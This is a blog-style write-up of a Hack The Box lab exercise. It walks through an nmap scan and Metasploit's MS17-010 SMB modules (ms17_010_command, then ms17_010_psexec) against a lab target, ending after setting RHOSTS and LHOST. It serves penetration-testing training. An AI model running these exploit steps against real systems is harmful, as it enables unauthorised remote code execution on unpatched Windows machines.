---
layout: single
title: "using metasploit framework- Hackthebox"
excerpt: "Full penetration test of a machine by exploiting eternal blue SMB exploit"
date: 2024-01-20
type: red-team
featured: true
author_profile: false
tags:
  - Metasploit Framework
  - windows powershell
  - SMB
  - Kali Linux
header:
  teaser: /assets/images/projects/dvwa.png
---

## Overview

This module focuses entirely on using the Metasploit framework for exploiting vulnerabilities. We start by identifying an exploit, checking whether our target machine is vulnerable to it, and then exploiting it.


## Scope

| Target | IP |
|--------|-----|
| machine | 10.129.2.141 |
| Environment | Kali Linux → VirtualBox VM |
| Methodology | use of exploit in Metasploit framework |

## Vulnerabilities Found

### 1.I ran an Nmap scan to confirm that port 445 is open since it’s the one associate with SMB protocol and EternalRomance is a handful of exploit tools for the SMB protocol.

```
nmap -sC -sV 10.129.2.141
```



---

### 2. I opened Metasploit framework console using the command msfconsole and searched for EternalRomance.


```
msfconsole
```
```
search eternalromance
```

**Findings:** From the question we are expect to find a flag.txt file on the administrator’s desktop. According to Metasploit module types, the type auxiliary is the one that deals with admin capabilities. From our out put its index number: 9 and name: auxiliary/admin/smb/ms17_010_command

---

### 3. I now used the auxiliary module in my exploit endeavor using the command use 9

```
use 9
```

---

### 4. I now looked for the options that need to be set for a successful exploit.

```
options
```
---

### 5. I set all module options that were marked Required: yes, and had an empty Current Setting. That option was RHOSTS which indicates my target IP.
```
set RHOSTS 10.129.2.141
```
---
### 6. I launched the exploit using the command run.
```
run
```
**Findings:** The exploit ran successfully but did not give me an interactive shell. Because of this I can’t get the file flag.txt. I therefore go back and look for an exploit that can give me an interactive shell.
---
### 7.I now used the module type exploit indexed at 0 with the name exploit/windows/smb/ms17_010_psexec. I used the command use 0 and searched for options.
```
use 0
```
----
### 8: set the LHOST: local IP and RHOSTS: target IP.
```
set LHOST 10.10.14.70
```
```
set RHOSTS 10.129.2.141
```
## Tools Used

- Metasploit Framework
  - windows powershell
  - SMB
  - Kali Linux
  - 

## Source

[Write-up on GitHub](https://github.com/austinasangai/ctfs/blob/main/metasploit_framework.md)
